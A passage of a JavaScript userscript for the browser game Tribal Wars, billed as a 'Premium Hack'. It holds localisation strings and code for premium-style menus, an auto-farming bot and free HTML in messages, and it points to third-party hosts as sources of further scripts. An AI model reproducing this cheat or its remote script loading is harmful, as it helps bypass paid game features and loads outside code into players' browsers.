				lang_bar[7] = 'السوق';  
				lang_bar[8] = 'TWStats';  
				lang_bar[9] = 'جدول التطوير';

				lang_reports[0] = 'كل التقارير';  
				lang_reports[1] = 'الهجمات';  
				lang_reports[2] = 'تقارير الدفاع ';  
				lang_reports[3] = 'دعم';  
				lang_reports[4] = 'التبادل';  
				lang_reports[5] = 'اخرى';  
				lang_reports[6] = 'تمرير';  
				lang_reports[7] = 'فلترة';  
				lang_reports[8] = 'تجاهل المرسل';  
				lang_reports[9] = 'نشر التقارير';

				lang_mail[0] = 'البريد';  
				lang_mail[1] = 'الرسائل العامة';  
				lang_mail[2] = 'كتابة رسالة';  
				lang_mail[3] = 'تجاهل مرسل';  
				lang_mail[4] = 'فهرس العناوين';

				lang_ally[0] = 'الرئيسية';  
				lang_ally[1] = 'الملف الشخصي';  
				lang_ally[2] = 'الاعضاء';  
				lang_ally[3] = 'العلاقات الدبلوماسية';  
				lang_ally[4] = 'الحروب ';  
				lang_ally[5] = 'مخطط حجز احتلال القري ';  
				lang_ally[6] = 'الدعوات';  
				lang_ally[7] = 'رسالة الترحيب';  
				lang_ally[8] = 'الخصائص';  
				lang_ally[9] = 'منتدى القبيلة';

				lang_ranking[0] = 'القبائل';  
				lang_ranking[1] = 'الاعبين';  
				lang_ranking[2] = 'القبائل في القارة';  
				lang_ranking[3] = 'الاعبين في القارة';  
				lang_ranking[4] = 'ترتيب افضل القبائل';  
				lang_ranking[5] = 'افضل لاعب';  
				lang_ranking[6] = 'الجوائز';  
				lang_ranking[7] = 'الحروب';

				lang_settings[0] = 'الملف الشخصي';  
				lang_settings[1] = 'خيارات';  
				lang_settings[2] = 'البريد الالكتروني';  
				lang_settings[3] = 'تغير كلمة المرور';  
				lang_settings[4] = 'بداية جديدة';  
				lang_settings[5] = 'حذف الحساب';  
				lang_settings[6] = 'اشعارات';  
				lang_settings[7] = 'الجوائز';  
				lang_settings[8] = 'اشتراك خط الانترنت';  
				lang_settings[9] = 'حضانة حساب';  
				lang_settings[10] = 'تسجيل الدخول';  
				lang_settings[11] = 'الاستفتائات';  
				lang_settings[12] = 'دعوة اللاعبين';  
				lang_settings[13] = 'شريط الأدوات';  
				lang_settings[14] = 'iPhone &amp; Android';  
				lang_settings[15] = 'تجاهل لاعب';  
				lang_settings[16] = 'الدعم الفني';  
				lang_settings[17] = 'عن السكربت';  
				lang_settings[18] = ' | التعريب بواسطة <b>الفــ عبدالله ــهمي</b>';
				lang_settings[19] = 'تغيير اسم المستخدم';  
				lang_settings[20] = 'اعدادات السكربت';  

				lang_premium[0] = 'استخدام النقاط';  
				lang_premium[1] = 'شراء نقاط التميز';  
				lang_premium[2] = 'تحويل نقاط';  
				lang_premium[3] = 'السجل';

				lang_screen_settings[0] = 'قائمة الشكل العام';  
				lang_screen_settings[1] = 'الوضع العادي: تحويل الى القرية في الشكل العام';  
				lang_screen_settings[2] = 'الوضع المباشر: التحويل الى القرية مباشرةً';  
				lang_screen_settings[3] = 'مجموعة الصور المتوفرة';  
				lang_screen_settings[4] = 'رابط ملف CSS:';  
				lang_screen_settings[5] = 'اظهار العالم في عنوان الصفحة';  
				lang_screen_settings[6] = 'تفعيل ';  
				lang_screen_settings[7] = 'اغلاق';

				lang_tools[0] = 'البار الديناميكي';  
				lang_tools[1] = 'اظهر البار الديناميكي';  
				lang_tools[2] = 'البار السريع:';  
				lang_tools[3] = 'اظهر البار السريع';  
				lang_tools[4] = 'سكربت المزرعة:';  
				lang_tools[5] = 'تفعيل سكربت المزرعة';  
				lang_tools[6] = 'اكواد الرسائل:';  
				lang_tools[7] = 'تفعيل اكواد الرسائل';  
				lang_tools[8] = 'اسهم القرى:';  
				lang_tools[9] = 'اظهار أسهم التنقل السريع بين القرى';  
				lang_tools[10] = 'باقي المزارع:';  
				lang_tools[11] = 'حساب الباقي من المزارع';  
				lang_tools[12] = 'تفعيل السكربت:';  
				lang_tools[13] = 'تفعيل مزايا السكربت';  

				lang_screen_sobre[0] = 'المميزات';  
				lang_screen_sobre[1] = 'البار السريع الديناميكي';  
				lang_screen_sobre[2] = 'البار السريع';  
				lang_screen_sobre[3] = 'تعديل مباشر في السكربت';  
				lang_screen_sobre[4] = 'الملاحظات في الشكل العام لتحدد نوع القرية';  
				lang_screen_sobre[5] = 'التنقل بالاسهم بين القرى';  
				lang_screen_sobre[6] = 'طريقة جديدة لتصدير التقارير';  
				lang_screen_sobre[7] = 'عن طريق BB codes او  html او صورة';  
				lang_screen_sobre[8] = 'حساب الموارد ثم نهب على القرية ';  
				lang_screen_sobre[9] = 'فقط في تقارير التجسس';  
				lang_screen_sobre[10] = 'تصدير معلومات اللاعب في جدول';  
				lang_screen_sobre[11] = 'النهب من نقطة التجمع <b>(الناهب الآلي نسخة اولية "تجريبية")</b>';  
				lang_screen_sobre[12] = 'اعدادات الناهب كل قرية لوحدها';  
				lang_screen_sobre[13] = 'البحث عن القرى من الخريطة لاضافتها للقائمة النهب ';  
				lang_screen_sobre[14] = 'المظهر الحي لقائمة القرى ';  
				lang_screen_sobre[15] = 'للتشغيل';  
				lang_screen_sobre[16] = 'الخريطة والخريطة المصغرة مع امكانية تعديلها';  
				lang_screen_sobre[17] = 'حزمة الجرافيك';  
				lang_screen_sobre[18] = 'اعداد حزمة الجرافيك';  
				lang_screen_sobre[19] = 'معلومات الاصدار';  
				lang_screen_sobre[20] = '» الاصدار الحالي:';  
				lang_screen_sobre[21] = 'الخيارات -> الخيارات';  
				lang_screen_sobre[22] = 'من معلومات الاعب او القرية او القبيلة';  
				lang_screen_sobre[23] = '» الاصدار الأخير:';  
				lang_screen_sobre[24] = 'صقل العملات الذهبية تلقائياً حتى استنفاذ الموارد';  
				lang_screen_sobre[25] = 'حجز القرية مباشرة من ملفها الشخصي';  
				lang_screen_sobre[26] = 'امكانية تغيير سيرفر السكربت من الاعدادات, اذا كان السكربت لايعمل';  
				lang_screen_sobre[27] = 'الاحصائيات في الملف الشخصي للقبيلة';      
				
				lang_screen_ally[0] = 'النقاط:';  
				lang_screen_ally[1] = 'القرى:';  
				lang_screen_ally[2] = 'الاعضاء:';  
				lang_screen_ally[3] = 'نقاط الدفاع والهجوم:';  
				lang_screen_ally[4] = 'نقاط الهجوم:';  
				lang_screen_ally[5] = 'نقاط الدفاع:';  
				lang_screen_ally[6] = 'احصائيات القبيلة';  

				lang_report[0] = 'انسخ التقرير من العنوان " الموضوع"والالصقه في هذه المنطقة(لا يعمل في النسخة العربية حاليا)';  
				lang_report[1] = '» نشر هذا التقرير';
				lang_report[2] = 'الاعدادات';
				lang_report[3] = 'نوع التقرير';
				lang_report[4] = 'منتدى الداخلي';
				lang_report[5] = 'المنتدى الرئيسي';
				lang_report[6] = 'منتدى خارجي';
				lang_report[7] = 'نسخة مصورة';
				lang_report[8] = 'المهاجم:';
				lang_report[9] = 'المدافع:';
				lang_report[10] = 'عرض:';
				lang_report[11] = 'اسم اللاعب';
				lang_report[12] = 'بيانات القرية';
				lang_report[13] = 'الجيوش';
				lang_report[14] = 'الخسائر';
				lang_report[15] = 'Belief';
				lang_report[16] = 'قائد الفرسان';
				lang_report[17] = 'Opponents defeated - points:';
				lang_report[18] = 'المهاجم';
				lang_report[19] = 'المدافع';
				lang_report[20] = 'Main:';
				lang_report[21] = 'Haul';
				lang_report[22] = 'مستويات المباني';
				lang_report[23] = 'تغير الولاء';
				lang_report[24] = 'اضرار محطمة الحائط';
				lang_report[25] = 'اضرار المقاليع';
				lang_report[26] = 'الجيوش خارج القرية';

				lang_farmar = 'الناهب';  
				lang_calc_reports = '» حساب الموارد ثم النهب';  

				lang_perfil[0] = '» ملف اللاعب';  
				lang_perfil[1] = '» ملف القبيلة';  
				lang_perfil[2] = '» ملف القرية';  
				lang_perfil[3] = '» تحويل معلومات الاعب لأكواد BB codes ';  
				lang_perfil[4] = '» حجز القرية';  

				lang_farmer[0] = 'اعدادات الناهب';  
				lang_farmer[1] = 'ملاحظة: السكربت يحفظ البيانات في الكوكيز , احذر من مسح الكوكيز من المتصفح , لانه سوف يمسح الاعدادات من السكربت.';  
				lang_farmer[2] = 'الاحداثيات:';  
				lang_farmer[3] = '» حفظ';   

				lang_spear = 'مقاتل الرمح  ';  
				lang_sword = 'مقاتل سيف';  
				lang_axe = 'مقاتل الفاس';  
				lang_archer = 'رامي اسهم';  
				lang_spy = 'كشافة';  
				lang_light = 'فارس خفيف';  
				lang_marcher = 'فارس القوس';  
				lang_heavy = 'فارس ثقيل';  
				lang_ram = 'محطمة حائط';  
				lang_catapult = 'مقلاع';  
				lang_knight = 'قائد الفرسان';  
				lang_snob = 'نبيل';

				lang_map[0] = 'بحث عن قرى:';  
				lang_map[1] = 'قرى بربرية:';  
				lang_map[2] = 'حد ادنى:';  
				lang_map[3] = 'قرى الاعبين:';  
				lang_map[4] = 'حد اقصى:';  
				lang_map[5] = 'مسافة:';  
				lang_map[6] = '» بحث';    
				lang_map[7] = 'الخريطة المصغرة:';  
				lang_map[8] = 'الخريطة:';  
				lang_map[9] = 'تغير حجم الخريطة'; 
				
				lang_villages_notes = 'الملاحظات';  

				lang_messages [0] = 'تلميحات سكربت العضوية الخاصة';
				lang_messages [1] = 'استخدم الكود <b>[img][/img]</b> لإرفاق <b>صورة</b>';
				lang_messages [2] = 'استخدم الكود <b>[vid][/vid]</b> لإرفاق فيديو من <b>youtube</b>';
				lang_messages [3] = 'تفعيل اكواد HTML في الرسالة';
				lang_messages [4] = '* فقط الاعبين الذين لديهم السكربت يمكنهم مشاهدتها';

			}	
			else{
				//if (language == 'en'){        
				var warning = 'For the script to work correctly the first time you should go for the views of villages, so that the script load the coordinates.';
				var lang_language = 'Language';
				var lang_dados = 'Scripts server';
				var lang_dados2= 'If an error occurs with the scripts, change the server scripts';
				
				lang_bar[0] = 'Village Headquarters';
				lang_bar[1] = 'Recruit';
				lang_bar[2] = 'Stable';
				lang_bar[3] = 'Workshop';
				lang_bar[4] = 'Academy';
				lang_bar[5] = 'Smithy';
				lang_bar[6] = 'Rally point';
				lang_bar[7] = 'Market';
				lang_bar[8] = 'TWStats';
				lang_bar[9] = 'Development Track';
				
				lang_reports[0] = 'All reports';
				lang_reports[1] = 'Attacks';
				lang_reports[2] = 'Defenses';
				lang_reports[3] = 'Support';
				lang_reports[4] = 'Trade';
				lang_reports[5] = 'Miscellaneous';
				lang_reports[6] = 'Forwarded';
				lang_reports[7] = 'Filter';
				lang_reports[8] = 'Block sender';
				lang_reports[9] = 'Publicized reports';
				
				lang_mail[0] = 'Mail';
				lang_mail[1] = 'Circular mail';
				lang_mail[2] = 'Write message';
				lang_mail[3] = 'Block sender';
				lang_mail[4] = 'Address Book';
				
				lang_ally[0] = 'Overview';
				lang_ally[1] = 'Profile';
				lang_ally[2] = 'Members';
				lang_ally[3] = 'Diplomacy';
				lang_ally[4] = 'Wars';
				lang_ally[5] = 'Noble planner';
				lang_ally[6] = 'Recruitment';
				lang_ally[7] = 'Welcome';
				lang_ally[8] = 'Properties';
				lang_ally[9] = 'Tribal forum';
				
				lang_ranking[0] = 'Tribes';
				lang_ranking[1] = 'Player';
				lang_ranking[2] = 'Continent Tribes';
				lang_ranking[3] = 'Continent Players';
				lang_ranking[4] = 'Opponents defeated tribal ranking';
				lang_ranking[5] = 'Opponents defeated';
				lang_ranking[6] = 'Awards';
				lang_ranking[7] = 'Wars';
				
				lang_settings[0] = 'Profile';
				lang_settings[1] = 'Settings';
				lang_settings[2] = 'Email address';
				lang_settings[3] = 'Change password';
				lang_settings[4] = 'Start over';
				lang_settings[5] = 'Delete account';
				lang_settings[6] = 'Notifications';
				lang_settings[7] = 'Awards';
				lang_settings[8] = 'Share Internet connection';
				lang_settings[9] = 'Account Sitting';
				lang_settings[10] = 'Logins';
				lang_settings[11] = 'Surveys';
				lang_settings[12] = 'Recruit player';
				lang_settings[13] = 'Toolbar';
				lang_settings[14] = 'iPhone &amp; Android';
				lang_settings[15] = 'Block player';
				lang_settings[16] = 'Support ticket';
				lang_settings[17] = 'About the script';
				lang_settings[18] = '';
				lang_settings[20] = 'Settings script';
				
				lang_premium[0] = 'Redeem';
				lang_premium[1] = 'Purchase';
				lang_premium[2] = 'Transfer';
				lang_premium[3] = 'Log';
				
				lang_screen_settings[0] = 'Overviews Menu';
				lang_screen_settings[1] = 'Normal Mode: the villages are open in the overview';
				lang_screen_settings[2] = 'Direct Mode: the villages are open the same view of the previous';
				lang_screen_settings[3] = 'Graphic Pack';
				lang_screen_settings[4] = 'CSS link:';
				lang_screen_settings[5] = 'Show world in title';
				lang_screen_settings[6] = 'Enable';
				lang_screen_settings[7] = 'Disable';
				
				lang_tools[0] = 'Dynamic bar';
				lang_tools[1] = 'Dynamic showed the bar';
				lang_tools[2] = 'Quick bar:';
				lang_tools[3] = 'Showed rapid bar';
				lang_tools[4] = 'Script farm:';
				lang_tools[5] = 'Script activation farm';
				lang_tools[6] = 'codes messages:';
				lang_tools[7] = 'activate codes messages';
				lang_tools[8] = 'Arrows villages:';
				lang_tools[9] = 'Show arrows quick mobility between villages';
				lang_tools[10] = 'Other farms:';
				lang_tools[11] = 'The expense of the rest of the farm';
				lang_tools[12] = 'Activate the script:';
				lang_tools[13] = 'Activate the features of the script';

				lang_screen_sobre[0] = 'Functions';
				lang_screen_sobre[1] = 'Dynamic Menu Bar';
				lang_screen_sobre[2] = 'Premium Bar';
				lang_screen_sobre[3] = 'Editable directly in the script';
				lang_screen_sobre[4] = 'Notes in the villages to identify views';
				lang_screen_sobre[5] = 'Arrows to direct change of villages';
				lang_screen_sobre[6] = 'New way to report export';
				lang_screen_sobre[7] = 'In BB codes, html or image';
				lang_screen_sobre[8] = 'Script to calculate the resources and farmer the report';
				lang_screen_sobre[9] = 'Only in spy report';
				lang_screen_sobre[10] = 'Export profile information of a player on the table';
				lang_screen_sobre[11] = 'Script to farm located on the rally point <b>(auto farmer BETA)</b>';
				lang_screen_sobre[12] = 'Individual configuration for each village';
				lang_screen_sobre[13] = 'Script to search the villages on the map to use in conjunction with the script of to farm';
				lang_screen_sobre[14] = 'Dynamic views menu with list of villages';
				lang_screen_sobre[15] = 'Set open mode in';
				lang_screen_sobre[16] = 'Map & Minimap configurable';
				lang_screen_sobre[17] = 'Graphic Pack';
				lang_screen_sobre[18] = 'Configure Graphic Pack in';
				lang_screen_sobre[19] = 'Version Information';
				lang_screen_sobre[20] = '» Current version:';
				lang_screen_sobre[21] = 'Settings -> Settings';
				lang_screen_sobre[22] = 'Form external of player, village or tribe';
				lang_screen_sobre[23] = '» Last version:';
				lang_screen_sobre[24] = 'Minting gold coins automatically until exhaust the resources';
				lang_screen_sobre[25] = 'Reserve village directly from the profile of the itself';
				lang_screen_sobre[26] = 'Choice of scripts server on settings, if the scripts are not working';
				lang_screen_sobre[27] = 'Statistics on the tribe profile';						
				
				lang_screen_ally[0] = 'Points:';
				lang_screen_ally[1] = 'Villages:';
				lang_screen_ally[2] = 'Members:';
				lang_screen_ally[3] = 'OD:';
				lang_screen_ally[4] = 'ODA:';
				lang_screen_ally[5] = 'ODD:';
				lang_screen_ally[6] = 'Tribe Stats';
				
				lang_report[0] = 'Copy starting from "Subject" to the end of the report and paste text here in this area';
				lang_report[1] = '» Publicize this report';
				lang_report[2] = 'Settings';
				lang_report[3] = 'Type of the report';
				lang_report[4] = 'Internal forum';
				lang_report[5] = 'Main forum';
				lang_report[6] = 'External forum';
				lang_report[7] = 'Graphical version';
				lang_report[8] = 'Attacker:';
				lang_report[9] = 'Defender:';
				lang_report[10] = 'Show:';
				lang_report[11] = 'Login';
				lang_report[12] = 'Village data';
				lang_report[13] = 'Troops';
				lang_report[14] = 'Losses';
				lang_report[15] = 'Belief';
				lang_report[16] = 'Paladin';
				lang_report[17] = 'Opponents defeated - points:';
				lang_report[18] = 'Attacker';
				lang_report[19] = 'Defender';
				lang_report[20] = 'Main:';
				lang_report[21] = 'Haul';
				lang_report[22] = 'Building levels';
				lang_report[23] = 'Change of Loyalty';
				lang_report[24] = 'Damage by rams';
				lang_report[25] = 'Damage by catapults';
				lang_report[26] = 'Units outside of village';
				
				lang_farmar = 'Farmer';
				lang_calc_reports = '» Calculate Resources and to Farm';
				
				lang_perfil[0] = '» User file';
				lang_perfil[1] = '» Tribe file';
				lang_perfil[2] = '» Village file';
				lang_perfil[3] = '» Extract information from the player in BB code';
				lang_perfil[4] = '» Reserve Village';
				
				lang_farmer[0] = 'Farmer Settings';
				lang_farmer[1] = 'Note: The script stores the data in cookies, be careful to erase cookies from your browser, it also clears the settings made by the script.';
				lang_farmer[2] = 'Coordinates:';
				lang_farmer[3] = '» Save';	
				
				lang_spear = 'Spear fighter';
				lang_sword = 'Swordsman';
				lang_axe = 'Axeman';
				lang_archer = 'Archer';
				lang_spy = 'Scout';
				lang_light = 'Light cavalry';
				lang_marcher = 'Mounted archer';
				lang_heavy = 'Heavy cavalry';
				lang_ram = 'Ram';
				lang_catapult = 'Catapult';
				lang_knight = 'Paladin';
				lang_snob = 'Nobleman';
				
				lang_map[0] = 'Search villages:';
				lang_map[1] = 'Barbarian Villages:';
				lang_map[2] = 'min:';
				lang_map[3] = 'Players villages:';
				lang_map[4] = 'max:';
				lang_map[5] = 'Radius:';
				lang_map[6] = '» Search';	
				lang_map[7] = 'Mini map:';
				lang_map[8] = 'Map:';
				lang_map[9] = 'Change map size';	
				
				lang_villages_notes = 'Notes';		

				lang_messages [0] = 'Tips Tribalwars Premium Hack';
				lang_messages [1] = 'Use tags <b>[img][/img]</b> to attach an <b>image</b>';
				lang_messages [2] = 'Use tags <b>[vid][/vid]</b> to attach a video from <b>youtube</b>';
				lang_messages [3] = 'Allow HTML in messages free';
				lang_messages [4] = '* Only those who have the script can view';
				
			}
		}
	}

	if (getData(mundo + '_aldeias') == '') {
		if (location.href.indexOf('screen=overview_villages') < 1) {
			if (confirm(warning)) {				
				location.href = '/game.php?&screen=overview_villages';
			}
		}
	}
    
	localcs = getData(mundo + '_css');
	if (localcs.indexOf('.css') > -1) {
		localc = document.getElementsByTagName('link')[0];
		localcss = localc.href.substring(localc.href.indexOf('?'));
		localc.href = localcs + localcss;
	}
    
	visualizacoes = getData(mundo + '_visualizacoes');
	if (visualizacoes == 'direto') {
		direto_mode = ' checked';
		normal_mode = '';
	}
	else {
		direto_mode = '';
		normal_mode = ' checked';
	}



	aldeias1 = '';
	aldeiasnome = '';
	if (location.href.indexOf('overview_villages') > -1) {
		document.getElementById('production_table').getElementsByTagName('tr')[0].innerHTML += '<th width="7">' + lang_villages_notes + '</th>';
		document.getElementById('production_table').getElementsByTagName('th')[0].setAttribute('colspan', '2');
		aldeias = document.getElementById('production_table').getElementsByTagName('span');
		for (i = 0; i < aldeias.length; i++) {
			if (aldeias[i].id.indexOf('label_text_') > -1) {
				nome = trim(aldeias[i].textContent);
				if (nome.length > 34) {
					aldeiasnome += nome.substring(0, 19) + '... ' + nome.substring(nome.length - 13) + ' ** ';
				}
				else {
					aldeiasnome += nome + ' ** ';
				}
				aldeias1 += aldeias[i].id.substring(11) + ' ';
				aldeiacookie = getData(mundo + '_label_' + aldeias[i].id.substring(11));
				aldeias[i].parentNode.parentNode.parentNode.outerHTML += '<td><span id="_span_' + aldeias[i].id.substring(11) + '">' + aldeiacookie + '</span></td>';
				aldeias[i].parentNode.parentNode.parentNode.parentNode.innerHTML += '<td><span><input size="6" id="_edit_' + aldeias[i].id.substring(11) + '" value="' + aldeiacookie + '" onblur="' + str_setData + ' setCookie(game_data.world + \'_label_' + aldeias[i].id.substring(11) + '\', document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value); document.getElementById(\'_span_' + aldeias[i].id.substring(11) + '\').textContent = document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value;" onkeydown="if (event.keyCode == 13) {' + str_setData + ' setCookie(game_data.world + \'_label_' + aldeias[i].id.substring(11) + '\', document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value); document.getElementById(\'_span_' + aldeias[i].id.substring(11) + '\').textContent = document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value;}"></span></td>';
			}
		}
		setData(mundo + '_aldeias', trim(aldeias1));
		setData(mundo + '_aldeiasnome', aldeiasnome.substring(0, (aldeiasnome.length - 3)));
	}
    
	var screen1 = location.href.substring(location.href.indexOf('screen=') + 7);
	VillId = location.href.substring(location.href.indexOf("village=") + 8, location.href.indexOf("&"));
	aldeias1 = getData(mundo + '_aldeias');
	if (aldeias1.length < 2) {
		aldeias1 = VillId;
	}
	else {
		meuArray = aldeias1.split(' ');
		aldeiasnome = getData(mundo + '_aldeiasnome');
		aldeiasnome1 = aldeiasnome.split(' ** ');
		modo = getData(mundo + '_visualizacoes');
		if (modo == 'direto') {
			screen2 = screen1
                }
		else {
			screen2 = 'overview';
		}
	}
	if ((VillId.length < 2) || (VillId.length > 13)) {
		VillId = meuArray[0]
    };
	
	if (meuArray.indexOf(VillId) == -1) VillId = game_data.village.id;
	if (meuArray.indexOf(VillId) == -1) {
		if (location.href.indexOf('screen=overview_villages') < 1) {
			if (confirm(warning)) {
				location.href = '/game.php?&screen=overview_villages';
			}
		}
		VillId = meuArray[0];
	}
	
	sel_data_0 = '';
	sel_data_1 = '';
	sel_data_2 = '';
	if (getData(mundo + '_base') != '1'){
		base_scripts = 'http://dl.dropbox.com/u/72485850/tribalwarsbrasil/';
		sel_data_0 = ' selected';
	}
	else{
		base_scripts = 'http://algreeb.net76.net/scripts/';
		sel_data_2 = ' selected';
	}
	
	getElementsByClass('menu-item')[0].innerHTML += '<table id="villagelist" cellspacing="0" class="menu_column"><tbody></table>';
	if (getElementsByClass('menu_column')[1] == null) getElementsByClass('menu-item')[1].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=all">' + lang_reports[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=attack">' + lang_reports[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=defense">' + lang_reports[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=support">' + lang_reports[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=trade">' + lang_reports[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=other">' + lang_reports[5] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=forwarded">' + lang_reports[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=filter">' + lang_reports[7] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=block">' + lang_reports[8] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=public">' + lang_reports[9] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table></td>';
	if (getElementsByClass('menu_column')[2] == null) getElementsByClass('menu-item')[2].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=in">' + lang_mail[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=mass_out">' + lang_mail[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=new">' + lang_mail[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=block">' + lang_mail[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=address">' + lang_mail[4] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table></td>';
	if (getElementsByClass('menu_column')[3] == null) getElementsByClass('menu-item')[3].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=overview">' + lang_ally[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=profile">' + lang_ally[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=members">' + lang_ally[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=contracts">' + lang_ally[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=tribalwars">' + lang_ally[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + game_data.village.id + '&amp;screen=ally&amp;mode=reservations">' + lang_ally[5] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=invite">' + lang_ally[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=intro_igm">' + lang_ally[7] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=properties">' + lang_ally[8] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=forum&amp;check_external=">' + lang_ally[9] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table>';
	if (getElementsByClass('menu_column')[4] == null) getElementsByClass('bg')[0].innerHTML += '</div><table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=ally">' + lang_ranking[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=player">' + lang_ranking[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=con_ally">' + lang_ranking[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=con_player">' + lang_ranking[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=kill_ally">' + lang_ranking[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=kill_player">' + lang_ranking[5] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=awards">' + lang_ranking[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=wars">' + lang_ranking[7] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table>';
	if (getElementsByClass('menu_column')[5] == null) {
			getElementsByClass('menu-item')[7].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=profile">' + lang_settings[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=settings">' + lang_settings[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=email">' + lang_settings[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=change_name">' + lang_settings[19] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=change_passwd">' + lang_settings[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=move">' + lang_settings[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=delete">' + lang_settings[5] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=notify">' + lang_settings[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=award">' + lang_settings[7] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=share">' + lang_settings[8] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=vacation">' + lang_settings[9] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=logins">' + lang_settings[10] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=poll">' + lang_settings[11] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=ref">' + lang_settings[12] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=toolbar">' + lang_settings[13] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=push">' + lang_settings[14] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=block">' + lang_settings[15] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=ticket" target="_blank">' + 